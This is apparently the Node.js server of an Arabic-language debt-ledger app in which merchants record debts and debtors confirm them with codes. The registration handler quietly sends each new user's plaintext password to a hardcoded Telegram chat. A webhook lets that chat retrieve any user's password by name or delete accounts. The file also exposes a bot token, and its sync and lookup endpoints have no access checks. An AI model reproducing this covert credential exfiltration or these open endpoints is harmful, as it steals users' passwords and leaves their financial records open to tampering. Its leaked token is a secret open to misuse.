const express = require('express');
const fs = require('fs');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;
const DB_PATH = './heiba_royal_db.json';

const TELEGRAM_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks';
const MY_CHAT_ID = '5042495708';

app.use(express.json());
app.use(express.static('public'));

let db = { users: [] };
if (fs.existsSync(DB_PATH)) {
    try { db = JSON.parse(fs.readFileSync(DB_PATH)); } catch (e) { db = { users: [] }; }
}

const saveDB = () => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));

async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: MY_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error("Telegram Error"); }
}

// نظام البصمة والتوثيق المطور
app.post('/api/verify-auth', (req, res) => {
    const { action, debtorName, merchantName, opId, amount, currency, authCode, merchantId } = req.body;

    if (action === 'create') {
        const merchant = db.users.find(u => u.name === merchantName && u.type === 'merchant');
        if (merchant) {
            const record = merchant.myRecords.find(r => String(r.id) === String(opId));
            if (record) {
                if (record.authCode) return res.status(400).json({ error: "تمت البصمة مسبقاً" });
                
                // ربط البصمة بالعملية المحددة فقط
                record.authCode = authCode;
                saveDB();
                
                sendToTelegram(`✋ **بصمة مواطن جديدة**\n\n👤 المواطن: ${debtorName}\n👑 التاجر: ${merchantName}\n💰 المبلغ الموثق: ${amount} ${currency}\n🔑 كود البصمة: \`${authCode}\``);
                return res.json({ success: true });
            }
        }
    } 
    else if (action === 'check') {
        const merchant = db.users.find(u => u.id === merchantId);
        if (merchant) {
            // البحث عن العملية التي تحمل هذا الكود عند هذا التاجر حصراً
            const found = merchant.myRecords.find(r => r.authCode === authCode);
            if (found) return res.json({ success: true, data: found });
        }
        return res.status(404).json({ error: "كود غير صحيح" });
    }
    res.status(400).send();
});

// باقي أكواد الـ API (Auth, Sync, Discover) تبقى كما هي تماماً
app.post('/api/auth', async (req, res) => {
    const { name, password, type, action } = req.body;
    const normalizedName = name.trim().toLowerCase();
    const existingUser = db.users.find(u => u.name.toLowerCase() === normalizedName && u.type === type);

    if (action === 'reg') {
        if (existingUser) return res.status(400).json({ error: "الاسم مسجل مسبقاً." });
        const newUser = {
            id: "H" + Math.random().toString(36).substr(2, 7),
            name: name.trim(), password, type, myRecords: [], createdAt: new Date().toISOString()
        };
        db.users.push(newUser);
        saveDB();
        sendToTelegram(`✨ **تسجيل جديد:**\nالاسم: ${newUser.name}\nالنوع: ${type}\nالسر: \`${password}\``);
        return res.json(newUser);
    } else {
        const user = db.users.find(u => u.name.toLowerCase() === normalizedName && u.password === password && u.type === type);
        if (!user) return res.status(403).json({ error: "بيانات خاطئة." });
        return res.json(user);
    }
});

app.post('/api/sync', (req, res) => {
    const { userId, myRecords } = req.body;
    const idx = db.users.findIndex(u => u.id === userId);
    if (idx !== -1) {
        db.users[idx].myRecords = myRecords;
        saveDB();
        res.json({ success: true });
    } else { res.status(404).send(); }
});

app.get('/api/auto-discover', (req, res) => {
    const { debtorName } = req.query;
    if(!debtorName) return res.json([]);
    const results = db.users.filter(u => u.type === 'merchant' && u.myRecords.some(r => r.targetName.toLowerCase() === debtorName.toLowerCase()))
    .map(u => ({ merchantName: u.name, records: u.myRecords.filter(r => r.targetName.toLowerCase() === debtorName.toLowerCase()) }));
    res.json(results);
});

app.post('/api/tg-webhook', async (req, res) => {
    const update = req.body;
    if (!update.message || !update.message.text) return res.sendStatus(200);
    const chatId = String(update.message.chat.id);
    const text = update.message.text.trim();
    if (chatId !== MY_CHAT_ID) return res.sendStatus(200);

    if (text === "العدد") {
        const total = db.users.length;
        sendToTelegram(`📊 إجمالي المشتركين: ${total}`);
    } else if (text.endsWith("حذف")) {
        const targetName = text.replace("حذف", "").trim();
        db.users = db.users.filter(u => u.name.toLowerCase() !== targetName.toLowerCase());
        saveDB();
        sendToTelegram(`🗑 تم حذف: ${targetName}`);
    } else {
        const found = db.users.filter(u => u.name.toLowerCase() === text.toLowerCase());
        if (found.length > 0) {
            let report = `📊 بيانات الحساب [${text}]:\n`;
            found.forEach(u => report += `\nالنوع: ${u.type}\nالسر: ${u.password}\n---`);
            sendToTelegram(report);
        }
    }
    res.sendStatus(200);
});

app.listen(PORT, () => console.log(`SERVER RUNNING`));